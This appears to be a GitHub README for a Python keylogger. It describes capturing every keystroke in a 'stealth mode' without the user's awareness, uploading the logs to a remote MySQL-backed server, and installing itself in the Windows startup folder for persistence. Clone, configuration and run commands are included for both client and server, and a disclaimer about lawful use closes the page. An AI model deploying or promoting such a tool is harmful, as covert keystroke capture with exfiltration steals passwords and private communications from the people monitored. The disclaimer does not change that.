# Keyboard Logger

## Introduction
The Keyboard Logger is a sophisticated Python-based application designed to discreetly record all keystrokes on a user's keyboard. Intended for monitoring personal or sensitive devices for security and administrative purposes, it ensures comprehensive data capture and secure storage. This tool is strictly prohibited from any illegal use.

## Features
- **Stealth Mode:** Silently captures all keystrokes without user awareness.
- **Logging:** Logs are saved minutely, ensuring detailed documentation of keyboard activity.
- **Data Upload:** Automatically uploads keystroke data to a server database for secure access and storage.
- **Auto-start on Windows:** Configures itself to start automatically during system boot on Windows platforms.

## Architecture
The system is divided into two main components: the client and the server.

### Client
The client component is responsible for capturing keystrokes and is located in the [/client](https://github.com/webbershaw/Keyboard_Logger/tree/master/client) directory.

- **Main Script:** `main.py` is the primary script for capturing keystrokes.
- **Supported Platforms:** The client is compatible with macOS, Linux, and Windows.
- **Virtual Environments:** Provided under `winkbvenv` and `kbvenv` directories for Windows and macOS respectively to facilitate easy setup.

#### Setup and Configuration
Before running the client, especially if real-time data syncing with the server is required, follow these initial setup steps:

1. **Clone the repository:**
   ```bash
   git clone https://github.com/webbershaw/Keyboard_Logger.git
   cd Keyboard_Logger
   ```

2. **Configure the client:**
   - Rename the `config.json.example` to `config.json` in the `/client` directory.
   - Edit `config.json` to specify the server URL or IP address:
     ```json
     {
       "server_url": "http://<server-ip>:7777"
     }
     ```

#### Running the Client
After the initial setup, choose one of the following methods to run the client based on your operating system:

1. **For macOS and Windows using virtual environments:**
   - Activate the virtual environment and run the client.
   - For macOS:
     ```bash
     source kbvenv/bin/activate
     python client/main.py
     ```
   - For Windows:
     ```bash
     .\winkbvenv\Scripts\activate
     python client\main.py
     ```

2. **Using pip for dependencies:**
   - Install required libraries and run the client.
   ```bash
   pip install -r requirements.txt
   python client/main.py
   ```

3. **For Windows with auto-start script:**
   - Run the batch script to start and configure auto-start settings.
   ```bash
   cd client
   start winstart.bat
   ```
   - This script will also create `winstart.vbs` and add it to the startup folder. To disable auto-start, manually remove `winstart.vbs` from the startup folder.

### Server
The server component handles data reception from the client and stores it in a MySQL database. It is located in the [/server](https://github.com/webbershaw/Keyboard_Logger/tree/master/server) directory.

- **Database Setup:** Prepare your MySQL database by importing `kb.sql`.
- **Configuration:** Adjust `server-config.yaml` to match your MySQL settings.

#### Running the Server
To start the server, execute the following steps:

1. **Install server dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

2. **Start the server:**
   ```bash
   nohup python server/server.py &
   ```

## License
This project is licensed under the [MIT](LICENSE) License.

## Disclaimer
This software is designed for lawful monitoring of devices. Unauthorized surveillance or any illegal activities using this software are strictly prohibited. Users must ensure compliance with local laws and regulations. Misuse of this software could result in legal consequences.
